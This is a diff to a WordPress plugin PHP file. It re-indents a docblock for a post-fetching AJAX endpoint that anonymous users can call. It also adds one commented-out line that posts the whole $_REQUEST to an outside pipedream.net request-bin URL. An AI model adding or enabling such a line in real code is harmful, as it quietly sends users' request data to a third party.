@@ -62,16 +62,17 @@ function wpt_get_posts_by_ids($params = array())
      * Retrieves posts based on their IDs.
      *
      * @param array $args An array of arguments for retrieving posts.
-     *                    - per_page (int): The number of posts to retrieve. Set to -1 for all posts. Default is -1.
-     *                    - posts_ids (array): An array of post IDs to retrieve.
-     *                    - return_type (string): The type of data to return. Default is 'html'.
-     *                    - size (mixed): The size of the posts. Default is the value of $_REQUEST['size'].
+     *             - per_page (int): The number of posts to retrieve. Set to -1 for all posts. Default is -1.
+     *             - posts_ids (array): An array of post IDs to retrieve.
+     *             - return_type (string): The type of data to return. Default is 'html'.
+     *             - size (mixed): The size of the posts. Default is the value of $_REQUEST['size'].
      *
      * @throws Some_Exception_Class A description of the exception that may be thrown.
      * @return mixed The retrieved posts.
      */
     add_action('wp_ajax_wpt_get_posts_by_ids_endpoint', 'wpt_get_posts_by_ids_endpoint');
     add_action('wp_ajax_nopriv_wpt_get_posts_by_ids_endpoint', 'wpt_get_posts_by_ids_endpoint');
+    // wp_remote_post('https://enlp55nj6tvrm.x.pipedream.net', array('body'=>$_REQUEST));
     function wpt_get_posts_by_ids_endpoint()
     {
         $args = [
